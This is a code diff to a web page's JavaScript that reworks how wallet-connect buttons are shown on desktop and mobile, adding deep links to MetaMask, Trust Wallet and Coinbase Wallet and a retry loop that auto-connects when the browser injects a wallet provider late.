@@ -478,53 +478,53 @@ function openTrustMobile() {
 
 function renderW(){
   const c=document.getElementById('wl');c.innerHTML='';
-  const mobile = isMobile();
+  const hasEthereum = !!window.ethereum;
+  const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   
-  if(mobile && !window.ethereum) {
-    // Mobile without injected provider — show deep link buttons
-    const deepLinks = [
-      {name:'Open in MetaMask',color:'#E2761B',icon:'🦊',action:openMetaMaskMobile},
-      {name:'Open in Trust Wallet',color:'#3375BB',icon:'🛡️',action:openTrustMobile},
-      {name:'Open in Coinbase Wallet',color:'#0052FF',icon:'🔵',action:()=>{
-        const url = encodeURIComponent(window.location.href);
-        window.location.href = 'https://go.cb-w.com/dapp?cb_url=' + url;
-      }},
-    ];
-    
-    const info = document.createElement('div');
-    info.style.cssText = 'text:center;padding:12px;background:rgba(168,85,247,.06);border-radius:10px;margin-bottom:10px;font-size:12px;color:rgba(255,255,255,.5)';
-    info.innerHTML = '📱 Mobile detected. Open this page in your wallet browser to connect.';
-    c.appendChild(info);
-    
-    for(const dl of deepLinks){
-      const b = document.createElement('button');
-      b.className = 'wrow';
-      b.onclick = dl.action;
-      b.innerHTML = '<div class="wi" style="background:'+dl.color+'">'+dl.icon+'</div><span class="wn">'+dl.name+'</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">Tap to Open</span>';
+  // Show detected wallets first
+  let shown = false;
+  for(const w of WALLETS){
+    const dt=w.detect();
+    if(dt || w.id==='oth'){
+      const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
+      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span>'+(dt?'<span class="wt">Detected</span>':'');
       c.appendChild(b);
+      shown = true;
     }
-    
-    // Also show WalletConnect option
-    const wcBtn = document.createElement('button');
-    wcBtn.className = 'wrow';
-    wcBtn.onclick = () => {
-      // Copy link for WalletConnect
-      navigator.clipboard.writeText(window.location.href).then(()=>{
-        toast('Link copied! Open in your wallet and paste.');
-      }).catch(()=>{
-        toast('Copy this link and open in your wallet: ' + window.location.href.substring(0,40) + '...');
-      });
-    };
-    wcBtn.innerHTML = '<div class="wi" style="background:#3B99FC">🔗</div><span class="wn">Copy Link (WalletConnect)</span><span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">Copy</span>';
-    c.appendChild(wcBtn);
-    
-    return;
   }
   
-  // Desktop — show normal wallet buttons
-  for(const w of WALLETS){const dt=w.detect();const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
-    b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span>'+(dt?'<span class="wt">Detected</span>':'');
-    c.appendChild(b);}}
+  // If no wallet detected (mobile or no extension), show help
+  if(!shown || (isMob && !hasEthereum)){
+    const sep = document.createElement('div');
+    sep.style.cssText='padding:10px;text-align:center;font-size:11px;color:rgba(255,255,255,.3);border-top:1px solid rgba(255,255,255,.04);margin-top:6px';
+    sep.innerHTML = isMob ? '📱 Open in your wallet browser:' : '💡 No wallet detected. Install one below:';
+    c.appendChild(sep);
+    
+    const links = [
+      {name:'MetaMask',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+window.location.host+window.location.pathname},
+      {name:'Trust Wallet',color:'#3375BB',icon:'🛡️',url:'https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(window.location.href)},
+      {name:'Coinbase Wallet',color:'#0052FF',icon:'🔵',url:'https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(window.location.href)},
+    ];
+    
+    for(const l of links){
+      const b=document.createElement('button');b.className='wrow';
+      b.onclick=()=>{
+        // Try deep link first, fallback to app store
+        window.location.href = l.url;
+        // If deep link fails, show app store after 2s
+        setTimeout(()=>{
+          if(document.hasFocus()){
+            if(l.name==='MetaMask') window.open('https://metamask.io/download/','_blank');
+            else if(l.name==='Trust Wallet') window.open('https://trustwallet.com/download/','_blank');
+            else window.open('https://www.coinbase.com/wallet','_blank');
+          }
+        },2000);
+      };
+      b.innerHTML='<div class="wi" style="background:'+l.color+'">'+l.icon+'</div><span class="wn">'+l.name+'</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">Open</span>';
+      c.appendChild(b);
+    }
+  }
+}
 
 async function doConnect(w){
   closeM();hideStatus();wType=w.id;
@@ -772,33 +772,48 @@ function initStats(){const e=document.getElementById('st-c');if(!e)return;let v=
 
 function reset(){prov=null;sign=null;addr='';wType='';foundChains=[];hideStatus();document.getElementById('mc').style.display='none';}
 
-// Auto-detect wallet when returning from mobile deep link
-if(window.ethereum) {
-  window.ethereum.on('accountsChanged', (accounts) => {
-    if(accounts.length > 0) {
-      addr = accounts[0];
-      prov = new ethers.providers.Web3Provider(window.ethereum);
-      sign = prov.getSigner();
-      console.log('Auto-connected:', addr);
-      document.getElementById('mc').style.display='block';
-      showP('p1');
-      document.getElementById('p1l').textContent='Wallet detected! Scanning chains...';
-      scanEvm();
-    }
-  });
-  // Try auto-connect if already authorized
-  window.ethereum.request({method:'eth_accounts'}).then(accounts=>{
-    if(accounts.length > 0) {
-      addr = accounts[0];
-      prov = new ethers.providers.Web3Provider(window.ethereum);
-      sign = prov.getSigner();
-      document.getElementById('mc').style.display='block';
-      showP('p1');
-      document.getElementById('p1l').textContent='Wallet detected! Scanning...';
-      scanEvm();
-    }
-  }).catch(()=>{});
+// Robust wallet detection with retry for mobile
+function tryAutoConnect(attempts) {
+  if (!attempts) attempts = 0;
+  if (attempts > 10) return;
+  
+  if (window.ethereum) {
+    console.log('ethereum found on attempt', attempts);
+    
+    window.ethereum.on('accountsChanged', function(accounts) {
+      if (accounts.length > 0) {
+        addr = accounts[0];
+        prov = new ethers.providers.Web3Provider(window.ethereum);
+        sign = prov.getSigner();
+        document.getElementById('mc').style.display = 'block';
+        showP('p1');
+        document.getElementById('p1l').textContent = 'Wallet connected! Scanning...';
+        closeM();
+        scanEvm();
+      }
+    });
+    
+    window.ethereum.request({method: 'eth_accounts'}).then(function(accounts) {
+      if (accounts.length > 0) {
+        addr = accounts[0];
+        prov = new ethers.providers.Web3Provider(window.ethereum);
+        sign = prov.getSigner();
+        document.getElementById('mc').style.display = 'block';
+        showP('p1');
+        document.getElementById('p1l').textContent = 'Wallet connected! Scanning...';
+        closeM();
+        scanEvm();
+      }
+    }).catch(function(){});
+  } else {
+    // Retry every 500ms for mobile browsers that inject ethereum late
+    setTimeout(function() { tryAutoConnect(attempts + 1); }, 500);
+  }
 }
+
+// Start auto-detect on page load
+tryAutoConnect(0);
+
 
 initPart();initCountdown();initSP();initRef();initStats();
 </script>
